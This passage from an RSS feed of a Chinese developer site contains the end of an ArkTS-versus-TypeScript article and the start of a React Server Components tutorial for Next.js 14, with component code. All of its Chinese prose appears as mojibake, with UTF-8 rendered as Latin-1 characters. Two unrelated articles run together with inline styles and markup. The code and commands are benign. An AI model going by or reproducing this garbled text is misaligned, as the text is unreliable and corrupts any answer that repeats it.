    .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">colorMode</span> === <span class="hljs-title class_">ColorMode</span>.<span class="hljs-property">LIGHT</span> ? <span class="hljs-title class_">Color</span>.<span class="hljs-property">White</span> : <span class="hljs-title class_">Color</span>.<span class="hljs-property">Black</span>)
  }
}
</code></pre>
<hr/>
<h2 data-id="heading-69">ArkTSä¸TypeScriptçš„ä¸»è¦åŒºåˆ«æ€»ç»“</h2>
<h3 data-id="heading-70">TypeScriptæ²¡æœ‰ä½†ArkTSæœ‰çš„æ ¸å¿ƒç‰¹æ€§ï¼š</h3>
<ol>
<li>
<p><strong>å£°æ˜å¼UIè£…é¥°å™¨ç³»ç»Ÿ</strong></p>
<ul>
<li><code>@Component</code>ã€<code>@Entry</code>ã€<code>@Preview</code> ç­‰ç»„ä»¶è£…é¥°å™¨</li>
<li>TypeScriptå®Œå…¨æ²¡æœ‰UIç»„ä»¶çš„æ¦‚å¿µ</li>
</ul>
</li>
<li>
<p><strong>å“åº”å¼çŠ¶æ€ç®¡ç†è£…é¥°å™¨</strong></p>
<ul>
<li><code>@State</code>ã€<code>@Prop</code>ã€<code>@Link</code>ã€<code>@Provide</code>ã€<code>@Consume</code></li>
<li><code>@ObjectLink</code>ã€<code>@Observed</code>ã€<code>@Watch</code></li>
<li>TypeScriptéœ€è¦å€ŸåŠ©ç¬¬ä¸‰æ–¹åº“ï¼ˆå¦‚MobXã€Reduxï¼‰</li>
</ul>
</li>
<li>
<p><strong>UIæ„å»ºä¸“ç”¨è¯­æ³•</strong></p>
<ul>
<li><code>struct</code> ç»“æ„ä½“å®šä¹‰ç»„ä»¶</li>
<li><code>build()</code> æ–¹æ³•å£°æ˜å¼æ„å»ºUI</li>
<li>é“¾å¼è°ƒç”¨è®¾ç½®å±æ€§</li>
<li>TypeScriptæ²¡æœ‰è¿™ç§å†…ç½®UIè¯­æ³•</li>
</ul>
</li>
<li>
<p><strong>å†…ç½®UIç»„ä»¶åº“</strong></p>
<ul>
<li>Columnã€Rowã€Stackã€Flexã€Gridç­‰å®¹å™¨ç»„ä»¶</li>
<li>Textã€Buttonã€Imageã€TextInputç­‰åŸºç¡€ç»„ä»¶</li>
<li>TypeScriptéœ€è¦ä¾èµ–ç¬¬ä¸‰æ–¹UIæ¡†æ¶</li>
</ul>
</li>
<li>
<p><strong>UIå¤ç”¨è£…é¥°å™¨</strong></p>
<ul>
<li><code>@Builder</code> è‡ªå®šä¹‰æ„å»ºå‡½æ•°</li>
<li><code>@Styles</code> æ ·å¼å¤ç”¨</li>
<li><code>@Extend</code> æ‰©å±•ç»„ä»¶</li>
<li><code>@CustomDialog</code> è‡ªå®šä¹‰å¼¹çª—</li>
<li>TypeScriptæ²¡æœ‰è¿™äº›UIå¤ç”¨æœºåˆ¶</li>
</ul>
</li>
<li>
<p><strong>æ¡ä»¶å’Œå¾ªç¯æ¸²æŸ“</strong></p>
<ul>
<li><code>ForEach</code>ã€<code>LazyForEach</code> ä¸“ç”¨å¾ªç¯è¯­æ³•</li>
<li>åœ¨buildæ–¹æ³•ä¸­ç›´æ¥ä½¿ç”¨if/else</li>
<li>TypeScriptéœ€è¦ä½¿ç”¨JSXæˆ–æ¨¡æ¿è¯­æ³•</li>
</ul>
</li>
<li>
<p><strong>çŠ¶æ€ç®¡ç†ç³»ç»Ÿ</strong></p>
<ul>
<li><code>LocalStorage</code> é¡µé¢çº§çŠ¶æ€</li>
<li><code>AppStorage</code> åº”ç”¨çº§çŠ¶æ€</li>
<li><code>PersistentStorage</code> æŒä¹…åŒ–å­˜å‚¨</li>
<li><code>Environment</code> ç¯å¢ƒå˜é‡</li>
<li>TypeScriptéœ€è¦ç¬¬ä¸‰æ–¹çŠ¶æ€ç®¡ç†åº“</li>
</ul>
</li>
<li>
<p><strong>èµ„æºç®¡ç†ç³»ç»Ÿ</strong></p>
<ul>
<li><code>$r()</code> èµ„æºå¼•ç”¨</li>
<li><code>$rawfile()</code> åŸå§‹æ–‡ä»¶å¼•ç”¨</li>
<li>TypeScriptæ²¡æœ‰ç»Ÿä¸€çš„èµ„æºç®¡ç†ç³»ç»Ÿ</li>
</ul>
</li>
<li>
<p><strong>å¹¶å‘å’Œæ€§èƒ½ä¼˜åŒ–</strong></p>
<ul>
<li><code>@Concurrent</code> å¹¶å‘è£…é¥°å™¨</li>
<li><code>@Reusable</code> ç»„ä»¶å¤ç”¨</li>
<li><code>@AnimatableExtend</code> åŠ¨ç”»æ‰©å±•</li>
<li>TypeScriptéœ€è¦æ‰‹åŠ¨ç®¡ç†</li>
</ul>
</li>
<li>
<p><strong>é¸¿è’™ç‰¹æœ‰API</strong></p>
<ul>
<li>åˆ†å¸ƒå¼èƒ½åŠ›API</li>
<li>ç³»ç»ŸæœåŠ¡API</li>
<li>è®¾å¤‡ååŒAPI</li>
</ul>
</li>
</ol>
<h3 data-id="heading-71">ArkTSé™åˆ¶çš„TypeScriptç‰¹æ€§ï¼š</h3>
<ol>
<li>
<p><strong>ç¦ç”¨æˆ–é™åˆ¶çš„ç‰¹æ€§</strong></p>
<ul>
<li>ä¸¥æ ¼é™åˆ¶<code>any</code>ç±»å‹ä½¿ç”¨</li>
<li>ç¦æ­¢åŸå‹é“¾æ“ä½œ</li>
<li>ç¦æ­¢<code>eval</code>å’Œ<code>Function</code>æ„é€ å™¨</li>
<li>ç¦æ­¢<code>with</code>è¯­å¥</li>
<li>é™åˆ¶åŠ¨æ€å±æ€§è®¿é—®</li>
</ul>
</li>
<li>
<p><strong>æ›´ä¸¥æ ¼çš„ç±»å‹è¦æ±‚</strong></p>
<ul>
<li>å¼ºåˆ¶ç±»å‹å£°æ˜</li>
<li>æ›´ä¸¥æ ¼çš„nullå®‰å…¨æ£€æŸ¥</li>
<li>æ›´ä¸¥æ ¼çš„ç±»å‹æ¨æ–­</li>
</ul>
</li>
</ol>
<p><strong>æ€»ç»“ï¼š</strong> ArkTSåœ¨TypeScriptåŸºç¡€ä¸Šï¼Œæ–°å¢äº†å®Œæ•´çš„å£°æ˜å¼UIå¼€å‘ä½“ç³»ã€å“åº”å¼çŠ¶æ€ç®¡ç†ç³»ç»Ÿã€å†…ç½®ç»„ä»¶åº“ç­‰å¤§é‡TypeScriptæ²¡æœ‰çš„ç‰¹æ€§ï¼ŒåŒæ—¶é™åˆ¶äº†ä¸€äº›åŠ¨æ€ç‰¹æ€§ä»¥æé«˜æ€§èƒ½å’Œç±»å‹å®‰å…¨ã€‚è¿™ä½¿å¾—ArkTSæˆä¸ºä¸“é—¨ä¸ºé¸¿è’™åº”ç”¨å¼€å‘è®¾è®¡çš„è¯­è¨€ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‰ç«¯å®æµ‹ï¼šRSCä¸æ˜¯é“¶å¼¹ï¼Œä½†å®ƒçœŸçš„é‡æ„äº†æˆ‘çš„æŠ€æœ¯æ ˆ]]></title>    <link>https://juejin.cn/post/7580745065170649139</link>    <guid>https://juejin.cn/post/7580745065170649139</guid>    <pubDate>2025-12-08T03:20:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580745065170649139" data-draft-id="7580745065170616371" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‰ç«¯å®æµ‹ï¼šRSCä¸æ˜¯é“¶å¼¹ï¼Œä½†å®ƒçœŸçš„é‡æ„äº†æˆ‘çš„æŠ€æœ¯æ ˆ"/> <meta itemprop="keywords" content="å‰ç«¯,React.js"/> <meta itemprop="datePublished" content="2025-12-08T03:20:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¥‹æ–—çŒ¿"/> <meta itemprop="url" content="https://juejin.cn/user/1702522294632830"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‰ç«¯å®æµ‹ï¼šRSCä¸æ˜¯é“¶å¼¹ï¼Œä½†å®ƒçœŸçš„é‡æ„äº†æˆ‘çš„æŠ€æœ¯æ ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1702522294632830/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¥‹æ–—çŒ¿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:20:59.000Z" title="Mon Dec 08 2025 03:20:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2025å¹´çš„å‰ç«¯åœˆï¼ŒReact Server Componentsï¼ˆRSCï¼‰ä¸å†æ˜¯â€œæ¦‚å¿µè¯â€â€”â€”Next.js 14å°†å…¶è®¾ä¸ºé»˜è®¤æ¨¡å¼ï¼ŒVercelçš„ç”Ÿäº§ç¯å¢ƒæ•°æ®æ˜¾ç¤ºï¼Œé‡‡ç”¨RSCçš„é¡¹ç›®é¦–å±åŠ è½½é€Ÿåº¦å¹³å‡æå‡42%ã€‚ä½œä¸ºåˆšç”¨RSCé‡æ„å®Œä¸­åå°ç³»ç»Ÿçš„å‰ç«¯ï¼Œæˆ‘æƒ³è¯´ï¼šå®ƒä¸æ˜¯ç”¨æ¥æ›¿ä»£SSRçš„â€œæ–°ç©å…·â€ï¼Œè€Œæ˜¯é‡æ–°å®šä¹‰â€œå‰åç«¯è¾¹ç•Œâ€çš„æ ¸å¿ƒæ–¹æ¡ˆã€‚</p>
<p>è¿™ç¯‡æ–‡ç« ä¸èŠæ™¦æ¶©çš„åŸç†ï¼Œåªè®²RSCè½åœ°çš„â€œè®¤çŸ¥-å®æˆ˜-é¿å‘â€å…¨æµç¨‹ã€‚ä»â€œä¸ºä»€ä¹ˆRSCçªç„¶ç«äº†â€åˆ°â€œNext.js 14å®æˆ˜è¸©é›·â€ï¼Œå†åˆ°â€œæ€§èƒ½ä¼˜åŒ–çš„å…³é”®æŠ€å·§â€ï¼Œå¸¦ä½ åƒé€è¿™ä¸ªæ”¹å˜å‰ç«¯æ¶æ„çš„çƒ­ç‚¹æŠ€æœ¯ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€è®¤çŸ¥æ¾„æ¸…æœŸï¼šå…ˆææ‡‚RSCä¸æ˜¯ä»€ä¹ˆ</h2>
<p>æ¥è§¦RSCçš„ç¬¬ä¸€ä¸ªæœˆï¼Œæˆ‘è¸©çš„æœ€å¤§å‘æ˜¯â€œæŠŠå®ƒå½“SSRçš„å‡çº§ç‰ˆâ€ã€‚ç›´åˆ°çº¿ä¸Šå‡ºç°â€œæ°´åˆé”™è¯¯â€æ‰æ˜ç™½ï¼šRSCçš„æ ¸å¿ƒæ˜¯â€œç»„ä»¶è¿è¡Œç¯å¢ƒçš„æ‹†åˆ†â€ï¼Œè€Œéâ€œæ¸²æŸ“ä½ç½®çš„è½¬ç§»â€ã€‚å…ˆç”¨ä¸€å¼ è¡¨å˜æ¸…è¯¯åŒºï¼š</p>





























<table><thead><tr><th>æŠ€æœ¯æ–¹æ¡ˆ</th><th>æ ¸å¿ƒé€»è¾‘</th><th>èµ„æºåŠ è½½</th><th>æœ€å¤§ç—›ç‚¹</th></tr></thead><tbody><tr><td>ä¼ ç»ŸCSR</td><td>å®¢æˆ·ç«¯åŠ è½½JSåæ¸²æŸ“ç»„ä»¶</td><td>é¦–å±JSä½“ç§¯å¤§ï¼ŒåŠ è½½æ…¢</td><td>ç™½å±æ—¶é—´é•¿ï¼ŒSEOå·®</td></tr><tr><td>SSRï¼ˆå¦‚Next.js 13å‰ï¼‰</td><td>æœåŠ¡ç«¯æ¸²æŸ“HTMLï¼Œå®¢æˆ·ç«¯æ°´åˆ</td><td>é¦–å±HTMLå¿«ï¼Œä½†éœ€åŠ è½½å®Œæ•´JSæ°´åˆ</td><td>æ°´åˆå¼€é”€å¤§ï¼Œäº¤äº’å»¶è¿Ÿ</td></tr><tr><td>RSCï¼ˆNext.js 14ï¼‰</td><td>æœåŠ¡å™¨ç»„ä»¶è·‘æœåŠ¡ç«¯ï¼Œå®¢æˆ·ç«¯ç»„ä»¶è·‘æµè§ˆå™¨</td><td>ä»…ä¼ è¾“å®¢æˆ·ç«¯ç»„ä»¶JSï¼ŒæœåŠ¡å™¨ç»„ä»¶æ— JS</td><td>ç¯å¢ƒåŒºåˆ†å¤æ‚ï¼Œæ˜“å‡ºç°è·¨ç«¯é”™è¯¯</td></tr></tbody></table>
<p>æ ¸å¿ƒç»“è®ºï¼šRSCè§£å†³çš„æ˜¯â€œæ— æ•ˆJSä¼ è¾“â€é—®é¢˜â€”â€”æœåŠ¡å™¨ç»„ä»¶è´Ÿè´£æ•°æ®è·å–å’Œé™æ€UIï¼Œä¸ç”Ÿæˆå®¢æˆ·ç«¯JSï¼›åªæœ‰éœ€è¦äº¤äº’çš„éƒ¨åˆ†ç”¨å®¢æˆ·ç«¯ç»„ä»¶ï¼Œå®ç°â€œæŒ‰éœ€åŠ è½½JSâ€ã€‚</p>
<h2 data-id="heading-1">äºŒã€å®æˆ˜è½åœ°æœŸï¼šNext.js 14æ­å»ºRSCé¡¹ç›®çš„5æ­¥æµç¨‹</h2>
<p>Next.js 14æ˜¯ç›®å‰æœ€æˆç†Ÿçš„RSCå¼€å‘æ¡†æ¶ï¼Œé»˜è®¤å¯ç”¨App Routerï¼ŒæœåŠ¡å™¨ç»„ä»¶æ— éœ€é¢å¤–é…ç½®ã€‚ç»“åˆæˆ‘é‡æ„ç”¨æˆ·ç®¡ç†ç³»ç»Ÿçš„ç»éªŒï¼Œåˆ†äº«ä»0åˆ°1çš„è½åœ°æ­¥éª¤ï¼š</p>
<h3 data-id="heading-2">2.1 ç¯å¢ƒåˆå§‹åŒ–ï¼šé¿å¼€ç‰ˆæœ¬å…¼å®¹å‘</h3>
<p>RSCå¯¹Reactç‰ˆæœ¬è¦æ±‚ä¸¥æ ¼ï¼Œå¿…é¡»ä½¿ç”¨React 18.3+ã€‚åˆå§‹åŒ–æ—¶ç›´æ¥æŒ‡å®šNext.js 14ï¼Œé¿å…å› ä¾èµ–å†²çªå¯¼è‡´çš„â€œæœåŠ¡å™¨ç»„ä»¶æ— æ³•è¯†åˆ«â€é—®é¢˜ï¼š</p>
<pre><code class="hljs language-perl" lang="perl">// æ­£ç¡®åˆå§‹åŒ–å‘½ä»¤
npx create-<span class="hljs-keyword">next</span>-app@latest rsc-demo --example <span class="hljs-string">"https://github.com/vercel/next-learn/tree/main/react-foundations/rsc/01-intro"</span>
<span class="hljs-comment"># é€‰æ‹©App Routerï¼Œå¯ç”¨TypeScriptå’ŒESLint</span>
</code></pre>
<p>å®‰è£…å®Œæˆåï¼Œæ£€æŸ¥package.jsonä¾èµ–ï¼šç¡®ä¿react@^18.3.1ã€next@^14.0.3ï¼Œè¿™æ˜¯RSCè¿è¡Œçš„åŸºç¡€ã€‚</p>
<h3 data-id="heading-3">2.2 ç»„ä»¶åŒºåˆ†ï¼šç”¨â€œuse clientâ€åˆ’æ¸…è¾¹ç•Œ</h3>
<p>è¿™æ˜¯RSCå¼€å‘çš„æ ¸å¿ƒè§„åˆ™ï¼š<strong>ä¸å†™â€œuse clientâ€çš„å°±æ˜¯æœåŠ¡å™¨ç»„ä»¶</strong>ã€‚æˆ‘æ›¾å› æ¼å†™å¯¼è‡´â€œuseState is not definedâ€é”™è¯¯ï¼Œå› ä¸ºæœåŠ¡å™¨ç»„ä»¶ä¸æ”¯æŒReact Hooksã€‚</p>
<p>å®æˆ˜æ¡ˆä¾‹ï¼šç”¨æˆ·åˆ—è¡¨é¡µæ‹†åˆ†â€”â€”æœåŠ¡å™¨ç»„ä»¶è´Ÿè´£è·å–æ•°æ®å’Œæ¸²æŸ“è¡¨æ ¼ï¼Œå®¢æˆ·ç«¯ç»„ä»¶è´Ÿè´£æœç´¢æ¡†äº¤äº’ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æœåŠ¡å™¨ç»„ä»¶ï¼šapp/users/page.tsxï¼ˆæ— éœ€use clientï¼‰</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getUsers</span>(<span class="hljs-params">searchKey = <span class="hljs-string">''</span></span>) {
  <span class="hljs-comment">// æœåŠ¡å™¨ç»„ä»¶æ”¯æŒé¡¶å±‚awaitï¼Œç›´æ¥å‘èµ·åç«¯è¯·æ±‚ï¼ˆæ— è·¨åŸŸé—®é¢˜ï¼‰</span>
  <span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`https://api.example.com/users?keyword=<span class="hljs-subst">${searchKey}</span>`</span>, {
    <span class="hljs-attr">cache</span>: <span class="hljs-string">'no-store'</span> <span class="hljs-comment">// å®æ—¶æ•°æ®ç¦ç”¨ç¼“å­˜ï¼Œé™æ€æ•°æ®å¯ç”¨force-cache</span>
  });
  <span class="hljs-keyword">if</span> (!res.<span class="hljs-property">ok</span>) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'æ•°æ®è·å–å¤±è´¥'</span>);
  <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>();
}

<span class="hljs-comment">// æ¥æ”¶å®¢æˆ·ç«¯ç»„ä»¶ä¼ é€’çš„æœç´¢å‚æ•°ï¼ˆé€šè¿‡URL SearchParamsï¼‰</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">UsersPage</span>(<span class="hljs-params">{
  searchParams
}: {
  searchParams?: { keyword?: string }
}</span>) {
  <span class="hljs-keyword">const</span> users = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getUsers</span>(searchParams?.<span class="hljs-property">keyword</span> || <span class="hljs-string">''</span>);
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"container mx-auto p-4"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-2xl font-bold mb-6"</span>&gt;</span>ç”¨æˆ·ç®¡ç†<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
      {/* å‘å®¢æˆ·ç«¯ç»„ä»¶ä¼ é€’é»˜è®¤æœç´¢å€¼ */}
      <span class="hljs-tag">&lt;<span class="hljs-name">UserSearch</span> <span class="hljs-attr">defaultKeyword</span>=<span class="hljs-string">{searchParams?.keyword</span> || ''} /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"mt-6 overflow-x-auto"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"w-full border-collapse"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"bg-gray-100"</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"border p-3 text-left"</span>&gt;</span>ID<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"border p-3 text-left"</span>&gt;</span>å§“å<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"border p-3 text-left"</span>&gt;</span>è§’è‰²<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"border p-3 text-left"</span>&gt;</span>æ“ä½œ<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span>
            {users.map((user: { id: number; name: string; role: string }) =&gt; (
              <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{user.id}</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"hover:bg-gray-50"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"border p-3"</span>&gt;</span>{user.id}<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"border p-3"</span>&gt;</span>{user.name}<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"border p-3"</span>&gt;</span>{user.role}<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"border p-3"</span>&gt;</span>
                  {/* æ“ä½œæŒ‰é’®éœ€äº¤äº’ï¼Œå¼•å…¥å°å‹å®¢æˆ·ç«¯ç»„ä»¶ */}
                  <span class="hljs-tag">&lt;<span class="hljs-name">UserAction</span> <span class="hljs-attr">userId</span>=<span class="hljs-string">{user.id}</span> /&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span>
              <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span>
            ))}
          <span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}

<span class="hljs-comment">// å®¢æˆ·ç«¯ç»„ä»¶ï¼šapp/users/UserSearch.tsxï¼ˆå¿…é¡»åŠ use clientï¼‰</span>
<span class="hljs-string">'use client'</span>;
<span class="hljs-keyword">import</span> { useState } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { useRouter } <span class="hljs-keyword">from</span> <span class="hljs-string">'next/navigation'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">UserSearch</span>(<span class="hljs-params">{ defaultKeyword }: { defaultKeyword: string }</span>) {
  <span class="hljs-comment">// å®¢æˆ·ç«¯ç»„ä»¶å¯ä½¿ç”¨Hooksç®¡ç†äº¤äº’çŠ¶æ€</span>
  <span class="hljs-keyword">const</span> [keyword, setKeyword] = <span class="hljs-title function_">useState</span>(defaultKeyword);
  <span class="hljs-keyword">const</span> router = <span class="hljs-title function_">useRouter</span>();

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleSearch</span> = (<span class="hljs-params">e: React.FormEvent</span>) =&gt; {
    e.<span class="hljs-title function_">preventDefault</span>();
    <span class="hljs-comment">// é€šè¿‡è·¯ç”±ä¼ é€’æœç´¢å‚æ•°ï¼Œè§¦å‘æœåŠ¡å™¨ç»„ä»¶é‡æ–°è·å–æ•°æ®</span>
